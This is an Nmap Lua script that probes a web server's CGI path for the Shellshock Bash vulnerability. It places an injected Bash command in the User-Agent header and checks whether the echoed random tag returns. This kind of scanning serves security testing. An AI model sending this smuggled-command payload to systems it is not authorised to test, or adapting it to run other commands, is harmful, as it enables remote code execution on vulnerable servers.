local http = require "http"
local shortport = require "shortport"
local os = require "os"

portrule = shortport.http

action = function(host, port)
    local tag = os.time() .. tostring(math.random(100000, 999999))
    local payload = string.format("() { :; }; echo -e \"Content-type: text/plain\\n\"; echo %s; exit", tag)

    local response = http.get(host, port, "/cgi-bin/vulnerable", { header = { ["User-Agent"] = payload } })
    if response and response.body and response.body:match(tag) then
        return "Shellshock vulnerability DETECTED!"
    end
    return "Shellshock vulnerability NOT FOUND!"
end